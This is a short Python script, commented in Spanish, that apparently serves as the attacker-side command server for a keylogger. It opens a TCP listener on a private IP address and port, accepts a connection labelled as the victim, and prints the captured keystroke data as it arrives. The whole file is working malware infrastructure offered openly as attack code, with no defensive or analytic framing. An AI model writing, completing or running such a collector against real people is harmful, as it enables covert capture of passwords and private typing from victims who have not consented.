import socket

class Atacante:
    def __init__(self):
        # Crear un socket para IPv4 y protocolo TCP
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = "192.168.1.150"  # Definir la dirección del servidor
        self.port = 4040  # Definir el puerto de escucha

    def main(self):
        # Vincular el socket al servidor y puerto
        self.server.bind((self.host, self.port))
        # Establecer el límite de conexiones simultáneas
        self.server.listen(1)
        print("[INFO] Esperando conexión del keylogger...")

        while True:
            # Aceptar la conexión entrante
            victim, address = self.server.accept()
            print("[INFO] Keylogger conectado con {0}".format(address[0]))

            while True:
                # Recibir datos del keylogger (se asume que cada paquete tiene 2 bytes)
                data = victim.recv(2)
                print(data)

def main():
    # Crear una instancia de la clase Atacante y ejecutar el método main
    attacker = Atacante()
    attacker.main()

if __name__ == "__main__":
    # Ejecutar la función main solo cuando el script es ejecutado directamente
    main()
